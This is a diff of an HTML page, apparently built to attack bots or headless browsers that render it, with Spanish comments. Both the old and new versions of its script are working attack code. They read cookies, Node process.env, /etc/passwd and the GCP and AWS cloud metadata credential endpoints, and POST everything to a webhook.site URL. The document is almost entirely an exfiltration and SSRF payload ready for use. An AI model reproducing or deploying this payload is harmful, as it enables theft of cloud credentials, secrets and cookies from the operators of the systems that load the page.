@@ -1,59 +1,56 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>SSRF Deep Dive</h2>
+    <h2>Environment Exfiltration</h2>
     <script>
         const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";
 
-        async function exfiltrate(data, label) {
-            try {
-                // Usamos fetch para enviar los datos al webhook
-                await fetch(`${webhookUrl}?leak=${label}`, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify(data)
-                });
-            } catch(e) {}
+        // Función para enviar datos al webhook
+        function exfiltrate(data, label) {
+            fetch(`${webhookUrl}?leak=${label}`, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: typeof data === 'string' ? data : JSON.stringify(data)
+            }).catch(() => {});
         }
 
-        async function runAttack() {
-            // 1. Intentar leer metadatos de Google Cloud (SSRF)
-            try {
-                const gcpRes = await fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
-                    headers: { "Metadata-Flavor": "Google" }
-                });
-                const gcpData = await gcpRes.text();
-                exfiltrate(gcpData, "gcp_token");
-            } catch(e) {
-                exfiltrate("Fallo GCP: " + e.message, "gcp_error");
+        // 1. Enviar datos del navegador/bot
+        exfiltrate({
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            origin: window.location.origin,
+            cookies: document.cookie,
+            time: new Date().toISOString()
+        }, "env_info");
+
+        // 2. Intentar leer variables de entorno (si el bot usa Node.js)
+        try {
+            // En Node.js, las variables de entorno están en process.env
+            if (typeof process !== 'undefined' && process.env) {
+                exfiltrate(process.env, "node_env");
             }
+        } catch(e) {}
 
-            // 2. Intentar leer metadatos de AWS (SSRF)
-            try {
-                const awsRes = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
-                const awsData = await awsRes.text();
-                exfiltrate(awsData, "aws_creds");
-            } catch(e) {
-                exfiltrate("Fallo AWS: " + e.message, "aws_error");
-            }
+        // 3. Intentar leer el archivo /etc/passwd (si el bot tiene acceso a file://)
+        fetch("file:///etc/passwd")
+            .then(res => res.text())
+            .then(data => exfiltrate(data, "lfi_passwd"))
+            .catch(() => {});
 
-            // 3. Intentar leer el archivo /etc/passwd (LFI) vía fetch local
-            try {
-                const lfiRes = await fetch("file:///etc/passwd");
-                const lfiData = await lfiRes.text();
-                exfiltrate(lfiData, "lfi_passwd");
-            } catch(e) {}
+        // 4. Intentar leer los metadatos de la nube (GCP)
+        fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
+            headers: { "Metadata-Flavor": "Google" }
+        })
+            .then(res => res.text())
+            .then(data => exfiltrate(data, "gcp_token"))
+            .catch(() => {});
 
-            // 4. Enviar las variables de entorno del navegador/bot
-            exfiltrate({
-                userAgent: navigator.userAgent,
-                origin: window.location.origin,
-                cookies: document.cookie,
-                timestamp: new Date().toISOString()
-            }, "env_info");
-        }
-
-        runAttack();
+        // 5. Intentar leer los metadatos de AWS
+        fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+            .then(res => res.text())
+            .then(data => exfiltrate(data, "aws_creds"))
+            .catch(() => {});
     </script>
 </body>
 </html>
